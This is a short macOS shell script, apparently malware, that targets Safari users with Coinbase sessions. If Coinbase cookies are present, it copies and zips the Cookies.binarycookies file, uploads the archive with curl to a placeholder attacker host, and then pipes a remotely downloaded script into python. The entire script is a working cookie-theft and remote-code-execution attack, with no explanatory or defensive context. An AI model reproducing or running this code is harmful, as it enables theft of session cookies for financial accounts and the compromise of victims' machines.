OUTPUT="$(id -un)"
cd ~/Library/Cookies
if grep -q "coinbase" "Cookies.binarycookies"; then
mkdir ${OUTPUT}
cp Cookies.binarycookies ${OUTPUT}/Cookies.binarycookies
zip -r interestingsafaricookies.zip ${OUTPUT}
curl --upload-file interestingsafaricookies.zip http://eviladdres:port
curl https://sitewithscript.s/script | python -
fi
